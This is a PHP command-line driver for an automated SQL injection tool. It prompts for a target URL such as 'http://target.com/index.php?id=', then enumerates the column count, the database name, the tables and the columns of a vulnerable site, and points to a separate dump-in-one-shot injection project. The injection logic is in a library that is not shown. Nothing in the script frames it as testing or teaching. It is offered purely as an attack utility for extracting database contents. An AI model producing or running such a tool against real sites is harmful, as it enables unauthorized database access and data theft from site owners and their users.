<?php

require "lib/AutoSqli.php";
$autosqli = new AutoSqli();

echo "[?] Set Url (ex. http://target.com/index.php?id= ): ";
$url = trim(fgets(STDIN, 1024));
AutoSqli::setUrl($url);

$start = microtime(true);

echo "[!] Target Url : " . AutoSqli::getUrl() . "\n";
AutoSqli::setNumColumns();

AutoSqli::setDatabase();
echo "[+] Database: " . AutoSqli::getDatabase() . "\n";

AutoSqli::setTable();
echo "[+] Table: " . AutoSqli::getTable() . "\n";

echo "[+] Columns: \n";
AutoSqli::setColumns();
AutoSqli::getColumns();

$time_elapsed_secs = round(microtime(true) - $start, 2);

echo "If table blank or not found you can use DIOS: https://github.com/Rizsyad/diosqli \n";
echo "End Time: $time_elapsed_secs s \n";
